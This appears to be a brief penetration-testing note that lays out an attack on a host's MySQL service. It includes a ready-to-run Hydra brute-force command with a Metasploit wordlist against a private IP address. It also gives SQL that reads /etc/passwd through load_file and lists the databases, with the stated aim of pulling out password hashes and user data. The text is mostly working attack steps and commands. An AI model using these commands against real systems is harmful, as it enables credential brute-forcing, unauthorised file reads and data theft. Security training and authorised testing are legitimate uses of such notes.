1.  Review the open ports on X to identify the MySQL, SSH and PostgreSQL
2. brute force password cracking tool such as Hydra to identify a MySQL account with weak credentials, and once connected to the MySQL server we can: 
        - Use the load_file function to read the /etc/passwd file. 
        - List the databases present 
        - Extract the data from tables that might contain password hashes / user data. 


### Hydra pass cracking ###
hydra -l root -P /usr/share/metasploit-framework/data/wordlists/password.lst mysql://192.168.3.100

###  Use the load_file function to read the /etc/passwd file ###
select load_file('/etc/passwd');
show databases;
